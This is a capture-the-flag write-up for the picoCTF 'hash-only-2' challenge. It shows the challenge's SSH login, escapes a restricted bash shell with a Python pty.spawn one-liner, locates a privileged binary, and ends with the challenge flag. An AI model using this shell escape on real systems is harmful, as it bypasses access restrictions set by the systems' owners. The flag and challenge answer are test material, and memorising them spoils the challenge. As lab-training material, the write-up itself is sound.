# hash-only-2

## Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! Connect using `ssh ctf-player@rescued-float.picoctf.net -p 49806` with the password, `6abf4a82` and run the binary named "flaghasher".

After opening the terminal we will give the command `sh` . The **sh** command invokes the default shell and uses its syntax and flags. The shell linked to the **/usr/bin/sh** path is the default shell. The standard configuration of the operating system links the **/usr/bin/sh** path to the Korn shell.

Now we will give the command $0 which tells about the refers to the name of the current script or shell.
So, it tells us about the rbash script where r means restricted. 
A restricted shell behaves identically to `bash` with the exception that the following are disallowed or not performed:

- Changing directories with the `cd` builtin.
- Setting or unsetting the values of the `SHELL`, `PATH`, `HISTFILE`, `ENV`, or `BASH_ENV` variables.
- Specifying command names containing slashes.
- Specifying a filename containing a slash as an argument to the `.` builtin command.

```
ctf-player@pico-chall$ sh
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ exit
ctf-player@pico-chall$ $0
-rbash: -rbash: command not found
```

We change the bash scripting environment by the command 

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This command if used for shell up gradation if you are in a restricted shell. 
- **`python3 -c`**: Runs the following Python code from the command line.  
- **`import pty`**: Imports the `pty` (pseudo-terminal) module.
- **`pty.spawn("/bin/bash")`**:
	- Spawns a new bash shell attached to a pseudo-terminal.
    - This gives you a more **interactive shell**, allowing usage of commands like `clear`, `tab-completion`, `Ctrl+C`, and `arrow keys` which may not work in a basic reverse shell.

Now we see that the shell is changes to /bin/rbash

```
ctf-player@pico-chall$ python3 -c 'import pty; pty.spawn("/bin/bash")'
ctf-player@challenge:~$ echo $SHELL
/bin/rbash
ctf-player@challenge:~$ ls
ctf-player@challenge:~$ cd /
ctf-player@challenge:/$ ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var

```

We find the flaghasher file by using the command 
```
find / -name flaghasher 2>/dev/null
```

Now the challenge will be solved in the same way as for the **[[2025/hash-only-1]]** 

```
ctf-player@challenge:/$ find / -name flaghasher 2>/dev/null
/usr/local/bin/flaghasher
ctf-player@challenge:/$ cd /usr/local/bin
ctf-player@challenge:/usr/local/bin$ ls
flaghasher

```
#### FLAG - picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_6e3b0209}
